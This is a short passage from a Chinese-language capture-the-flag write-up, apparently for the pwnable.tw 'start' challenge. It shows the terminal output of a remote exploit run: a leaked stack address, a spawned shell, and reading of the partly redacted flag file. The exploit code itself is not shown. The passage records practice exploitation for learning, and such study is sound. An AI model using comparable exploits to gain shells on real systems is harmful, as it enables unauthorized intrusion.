把剛剛的`exploit.py`換成雲端版後  
成功取得flag
```!=
└─$ python3 exploit.py
[q] Opening connection to chall.pwnable.tw on port 10000: Trying 139.162.123[+] Opening connection to chall.pwnable.tw on port 10000: Done
[+] Leaked ESP: 0xffe945c0
[*] Switching to interactive mode
\x01\x00\x00\x004_\xe9\xff\x00\x00\x00\x00F_\xe9\xff$ id
uid=1000(start) gid=1000(start) groups=1000(start)
$ cd home
$ ls
start
$ cd start
$ ls
flag
run.sh
start
$ cat flag
FLAG{Pw...rt}
```

## 補充
[AI 補充](AI補充.md)